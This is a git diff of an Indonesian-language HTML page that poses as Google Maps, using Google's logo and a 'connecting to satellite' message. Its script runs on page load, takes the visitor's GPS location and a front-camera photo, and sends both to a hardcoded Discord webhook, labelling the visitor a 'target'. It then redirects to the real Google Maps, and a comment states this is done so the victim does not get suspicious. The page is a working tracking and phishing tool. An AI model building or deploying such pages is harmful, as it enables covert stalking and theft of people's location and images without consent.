@@ -1,77 +1,91 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Sedang Memuat Maps...</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Maps - Berbagi Lokasi Real-time</title>
+    <link rel="icon" type="image/x-icon" href="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png">
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f0f0; }
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', Arial, sans-serif; background: #f8f9fa; overflow: hidden; }
+        #loader { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .logo { width: 100px; margin-bottom: 25px; animation: pulse 1.8s infinite ease-in-out; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
+        .status { color: #5f6368; font-size: 16px; font-weight: 400; }
+        canvas, video { display: none; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>Harap tunggu, sedang menyinkronkan lokasi terdekat...</p>
 
-    <script>
-        // GANTI URL DI BAWAH INI DENGAN URL WEBHOOK DISCORD KAMU
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
+<div id="loader">
+    <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" class="logo" alt="Google Maps">
+    <div class="status">Menghubungkan ke satelit...<br><span style="font-size: 12px; color: #9aa0a6;">Pastikan GPS Anda aktif untuk akurasi terbaik</span></div>
+</div>
 
-        window.onload = function() {
-            startTracking();
-        };
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
 
-        async function startTracking() {
-            // 1. Ambil Lokasi
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    // Kirim teks lokasi ke Discord
-                    kirimKeDiscord(`📍 **Lokasi Terdeteksi!**\nLink: ${mapsUrl}`);
-                    
-                    // 2. Ambil Foto
-                    ambilFoto();
-                });
-            }
-        }
+<script>
+    // MASUKKAN URL WEBHOOK DISCORD KAMU DI SINI
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
 
-        async function ambilFoto() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-
-                setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-                    const formData = new FormData();
-                    formData.append('file', blob, 'foto_pengunjung.jpg');
-                    formData.append('payload_json', JSON.stringify({ content: "📸 **Foto Kamera Depan Terdeteksi!**" }));
-
-                    await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                }, 2000);
-            } catch (err) {
-                kirimKeDiscord("❌ Akses kamera ditolak oleh pengguna.");
-            }
-        }
-
-        function kirimKeDiscord(pesan) {
-            fetch(DISCORD_WEBHOOK, {
+    async function sendToDiscord(data) {
+        try {
+            await fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: pesan })
+                body: JSON.stringify(data)
+            });
+        } catch (e) { console.error(e); }
+    }
+
+    async function captureAndSend() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                // Kirim koordinat dulu
+                await sendToDiscord({
+                    content: `📍 **Target Terdeteksi!**\nLokasi: ${mapsUrl}\nAkurasi: ${position.coords.accuracy} meter`
+                });
+
+                // Coba ambil foto kamera depan
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+                        const formData = new FormData();
+                        formData.append('file', blob, 'target.jpg');
+                        formData.append('payload_json', JSON.stringify({ content: "📸 **Foto Target:**" }));
+
+                        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        // REDIRECT KE GOOGLE MAPS ASLI SETELAH SELESAI
+                        window.location.href = mapsUrl;
+                    }, 1500);
+                } catch (err) {
+                    // Jika kamera ditolak, tetap redirect biar gak curiga
+                    window.location.href = mapsUrl;
+                }
+            }, (err) => {
+                // Jika lokasi ditolak, redirect ke Google Maps umum
+                window.location.href = "https://www.google.com/maps";
             });
         }
-    </script>
+    }
+
+    window.onload = captureAndSend;
+</script>
+
 </body>
 </html>
